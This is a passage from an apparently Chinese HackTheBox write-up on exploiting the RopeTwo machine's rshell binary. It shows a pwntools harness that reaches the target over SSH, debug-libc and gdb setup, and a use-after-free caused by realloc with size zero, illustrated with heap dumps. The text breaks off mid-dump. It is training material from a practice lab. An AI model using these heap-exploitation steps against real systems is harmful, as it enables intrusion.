<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import pdb</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">ls</span>():</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res.split(b<span class="string">&#x27;\n&#x27;</span>)[:-1]:</span><br><span class="line">        <span class="built_in">print</span>(line.decode())</span><br><span class="line"></span><br><span class="line">def add(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;add &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res.endswith(prompt.encode()): </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="built_in">return</span> res </span><br><span class="line">    </span><br><span class="line">def <span class="built_in">rm</span>(name, <span class="built_in">wait</span>=True):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;rm &#123;name&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">wait</span>:</span><br><span class="line">        p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">def edit(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;edit &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res == prompt: </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line">    p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rshell = ELF(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6-ropetwo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    remote = ssh(host=<span class="string">&#x27;10.10.10.196&#x27;</span>, user=<span class="string">&#x27;chromeuser&#x27;</span>, keyfile=<span class="string">&#x27;/root/keys/ed25519_gen&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote.run(<span class="string">&#x27;rshell&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>

<ul>
<li>Libc</li>
</ul>
<p>使用与RopeTwo相同的libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ ldd /usr/bin/rshell</span><br><span class="line">        linux-vdso.so.1 (0x00007ffd1df75000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbe10a9c000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fbe10c96000)</span><br></pre></td></tr></table></figure>

<p>使用scp来获取libc.so.6, (在我的主机把它命名为libc.so.6-ropetwo)和ld-linux-x86-64.so.2。</p>
<p>想要libc的debug符号，所以使用与<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIwLzA2LzI3L2h0Yi1wbGF5ZXJ0d28uaHRtbCNmaXgtaGVhcGluZm8=">PlayerTwo<i class="fa fa-external-link-alt"></i></span>相同的过程:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># proxychains wget https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">--2021-02-17 15:53:59--  https://answers.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">正在解析主机 answers.launchpad.net (answers.launchpad.net)... 224.0.0.1</span><br><span class="line">正在连接 answers.launchpad.net (answers.launchpad.net)|224.0.0.1|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  answers.launchpad.net:443  ...  OK</span><br><span class="line">已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 303 See Other</span><br><span class="line">位置：https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb [跟随至新的 URL]</span><br><span class="line">--2021-02-17 15:54:03--  https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">正在解析主机 launchpadlibrarian.net (launchpadlibrarian.net)... 224.0.0.2</span><br><span class="line">正在连接 launchpadlibrarian.net (launchpadlibrarian.net)|224.0.0.2|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  launchpadlibrarian.net:443  ...  OK</span><br><span class="line">已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：5698988 (5.4M) [application/x-debian-package]</span><br><span class="line">正在保存至: “libc6-dbg_2.29-0ubuntu2_amd64.deb”</span><br><span class="line"></span><br><span class="line">libc6-dbg_2.29-0ubuntu2_amd64.deb  100%[===============================================================&gt;]   5.43M  1.96MB/s  用时 2.8s    </span><br><span class="line"></span><br><span class="line">2021-02-17 15:54:09 (1.96 MB/s) - 已保存 “libc6-dbg_2.29-0ubuntu2_amd64.deb” [5698988/5698988])</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so &gt; libc-2.29.so</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># eu-unstrip libc.so.6-ropetwo libc-2.29.so</span></span><br><span class="line">──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># mv libc-2.29.so&#123;,-debug&#125;</span></span><br></pre></td></tr></table></figure>

<p>现在将使用patchelf告诉rshell使用这些:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./rshell</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># patchelf --replace-needed libc.so.6 ./libc-2.29.so-debug  ./rshell</span></span><br></pre></td></tr></table></figure>

<p>本地rshell正在使用这两个库:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ldd rshell</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffc0cdee000)</span><br><span class="line">        ./libc-2.29.so-debug (0x00007f0e2ec0c000)</span><br><span class="line">        ./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0e2ee00000)</span><br></pre></td></tr></table></figure>

<ul>
<li>gdb</li>
</ul>
<p>对于初始环境，在主机上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>来转向ASLR。这将允许在想要的地方放一个断点，而不必每次都调整。</p>
<p>为了跟踪堆，使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L1B3bmdkYg==">Pwngdb<i class="fa fa-external-link-alt"></i></span>(不要与pwndbg混淆)。heapinfo命令打印出各种freed bins的漂亮视图。</p>
<p>将所有这些放在一起，为gdb创建了以下初始化文件:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line">b *0x0000555555555c2b</span><br><span class="line"><span class="built_in">command</span> 1</span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont1p</span> = *((long int*)<span class="number">0</span>x555555558060)</span><br><span class="line">set <span class="variable">$cont1</span> = *(char[]*)<span class="variable">$cont1p</span></span><br><span class="line">set <span class="variable">$name1</span> = *(char[]*) <span class="number">0</span>x555555558068</span><br><span class="line">printf &quot;[<span class="number">0</span>x%<span class="number">08</span>x%<span class="number">08</span>x] %-<span class="number">8</span>s: %s\n&quot;, <span class="variable">$cont1p</span> &gt;&gt; <span class="number">32</span>, <span class="variable">$cont1p</span>, <span class="variable">$name1</span>, <span class="variable">$cont1</span></span><br><span class="line">set <span class="variable">$cont2p</span> = *((long int*)<span class="number">0</span>x555555558130)</span><br><span class="line">set <span class="variable">$cont2</span> = *(char[]*)<span class="variable">$cont2p</span></span><br><span class="line">set <span class="variable">$name2</span> = *(char[]*) <span class="number">0</span>x555555558138</span><br><span class="line">printf &quot;[<span class="number">0</span>x%<span class="number">08</span>x%<span class="number">08</span>x] %-<span class="number">8</span>s: %s\n&quot;, <span class="variable">$cont2p</span> &gt;&gt; <span class="number">32</span>, <span class="variable">$cont2p</span>, <span class="variable">$name2</span>, <span class="variable">$cont2</span></span><br><span class="line">echo -----------------------------------\n</span><br><span class="line">x/<span class="number">48</span>xg <span class="number">0</span>x55555555c2f0</span><br><span class="line">echo -----------------------------------\n</span><br><span class="line">heapinfo</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>这将在读取下一个命令之前，在0xc2b处设置一个断点。在这个断点处，它将计算出两个文件的名称和内容，并打印结果。然后，它将从堆中打印48个单词在工作的区域(确实修改了这个地址，因为关注的是堆的不同部分)。最后，它将运行heapinfo来显示bins。然后它会继续。通过这种方式，可以逐步遍历Python脚本并从那里运行函数，gdb窗口将继续在每个命令之后打印状态。</p>
<p>确实在~&#x2F;.gdbinit文件中注释了Peda的来源，因为无法让它停止在每个break上打印上下文，这会将正在打印的所有信息从屏幕上删除。</p>
<h2 id="放在一起"><a href="#放在一起" class="headerlink" title="放在一起"></a>放在一起</h2><p>现在，启动Python脚本，Python调试器(pdb)设置为停止在最后一行，以便可以继续运行命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># python3 -mpdb -c &#x27;b 57&#x27; -c c exp.py</span></span><br><span class="line">Breakpoint 1 at /root/hackthebox/machine/rope2/exp.py:57</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/rshell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/libc.so.6-ropetwo&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./rshell&#x27;</span>: pid 4649</span><br><span class="line">&gt; /root/hackthebox/machine/rope2/exp.py(57)&lt;module&gt;()</span><br><span class="line">-&gt; x=1</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>现在在另一个面板中，将附加gdb，然后告诉它继续:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># gdb -q -p $(pidof rshell) --command=gdb-rshell.init</span></span><br><span class="line">Attaching to process 4649</span><br><span class="line">Reading symbols from /root/hackthebox/machine/rope2/rshell...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> /root/hackthebox/machine/rope2/rshell)</span><br><span class="line">Reading symbols from ./libc-2.29.so-debug...</span><br><span class="line">Reading symbols from ./ld-linux-x86-64.so.2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./ld-linux-x86-64.so.2)</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0xc7 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x7fffffffe010 --&gt; 0x555555555c30 (push   r15)</span><br><span class="line">RSP: 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">RIP: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">R8 : 0x2 </span><br><span class="line">R9 : 0x7ffff7fcb5c0 (0x00007ffff7fcb5c0)</span><br><span class="line">R10: 0x3 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x555555555150 (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe0f0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7eebf7b &lt;__GI___libc_read+11&gt;:        jne    0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;</span><br><span class="line">   0x7ffff7eebf7d &lt;__GI___libc_read+13&gt;:        xor    eax,eax</span><br><span class="line">   0x7ffff7eebf7f &lt;__GI___libc_read+15&gt;:        syscall </span><br><span class="line">=&gt; 0x7ffff7eebf81 &lt;__GI___libc_read+17&gt;:        cmp    rax,0xfffffffffffff000</span><br><span class="line">   0x7ffff7eebf87 &lt;__GI___libc_read+23&gt;:        ja     0x7ffff7eebfe0 &lt;__GI___libc_read+112&gt;</span><br><span class="line">   0x7ffff7eebf89 &lt;__GI___libc_read+25&gt;:        ret    </span><br><span class="line">   0x7ffff7eebf8a &lt;__GI___libc_read+26&gt;:        nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;:        push   r12</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">0008| 0x7fffffffdf30 --&gt; 0x7ffff7ffeac0 --&gt; 0x7ffff7ffe9f0 --&gt; 0x7ffff7ffe758 --&gt; 0x7ffff7ffe730 --&gt; 0x7ffff7fd0000 (jg     0x7ffff7fd0047)</span><br><span class="line">0016| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf58 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf60 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x00007ffff7eebf81 <span class="keyword">in</span> __GI___libc_read (fd=0x0, buf=0x7fffffffdf40, nbytes=0xc7) at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line">26      ../sysdeps/unix/sysv/linux/read.c: 没有那个文件或目录.</span><br><span class="line">Breakpoint 1 at 0x555555555c2b</span><br></pre></td></tr></table></figure>

<p>当添加一个文件:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;test&#x27;</span>, 0x60, <span class="string">&#x27;this is a test&#x27;</span>) </span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>gdb更新：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[0x000055555555b260] <span class="built_in">test</span>    : this is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c380: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c390: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c460: 0x0000000000000000      0x0000000000000000</span><br><span class="line">-----------------------------------</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0                                                                                                                 </span><br><span class="line">(0x40)     fastbin[2]: 0x0                                                                                                                 </span><br><span class="line">(0x50)     fastbin[3]: 0x0                                                                                                                 </span><br><span class="line">(0x60)     fastbin[4]: 0x0                                                                                                                 </span><br><span class="line">(0x70)     fastbin[5]: 0x0                                                                                                                 </span><br><span class="line">(0x80)     fastbin[6]: 0x0                                                                                                                 </span><br><span class="line">(0x90)     fastbin[7]: 0x0                                                                                                                 </span><br><span class="line">(0xa0)     fastbin[8]: 0x0                                                                                                                 </span><br><span class="line">(0xb0)     fastbin[9]: 0x0                                                                                                                 </span><br><span class="line">                  top: 0x55555555b2c0 (size : 0x20d40)                                                                                     </span><br><span class="line">       last_remainder: 0x0 (size : 0x0)                                                                                                    </span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>开发这种漏洞利用程序太疯狂了。每次进入下一个步骤时，都必须返回并完全重新构建前一个，移动方块，尝试不同大小的bins。不可能在本文中展示所有这些步骤，但是，将尝试在完成的脚本中完成不同的目标，并展示如何使用脚本操作堆来完成所需要的任务。但是值得补充的是，当第一次在堆上获得libc地址时，代码看起来完全不同。当进入下一个步骤时，将使用相同的通用技术，但需要完全重新设计不同bins的间距和大小，以完成已经实现的目标和下一个目标。</p>
<h2 id="弱点"><a href="#弱点" class="headerlink" title="弱点"></a>弱点</h2><ul>
<li>描述</li>
</ul>
<p>这里的漏洞在于编辑命令中的realloc，以及它如何根据当前大小和新大小做出反应:</p>
<table>
<thead>
<tr>
<th align="left">大小比较</th>
<th align="left">采取动作</th>
</tr>
</thead>
<tbody><tr>
<td align="left">new_size &#x3D;&#x3D; 0</td>
<td align="left">free(buffer), return null</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &lt; orig_size</td>
<td align="left">分成两个块，返回相同的地址和更小的块，并在旧块的末尾留下空闲块</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &gt; orig_size</td>
<td align="left">释放旧块，为更大的块分配新块，并返回该地址。</td>
</tr>
</tbody></table>
<p>上面的代码检查返回值是否为null，但随后只打印一条消息，而不更改存储的指针。这会给用户留下一个指向已释放内存的指针，这是很糟糕的。</p>
<ul>
<li>例子</li>
</ul>
<p>为了看到这一点，将运行以下代码:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;1&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) add(<span class="string">&#x27;2&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) <span class="built_in">rm</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">(Pdb) edit(<span class="string">&#x27;2&#x27;</span>, 0)</span><br></pre></td></tr></table></figure>

<p>这样就剩下了以下内容(&lt;– 由我添加):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">[0x000055555555c2c0] 2       : `UUUU                        &lt;-- still have pointer to chunk2</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 1</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- tcache pointer null, key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 2</span><br><span class="line">0x55555555c2c0: 0x000055555555c260      0x000055555555c010  &lt;-- tcache pointer to freed 1, key</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      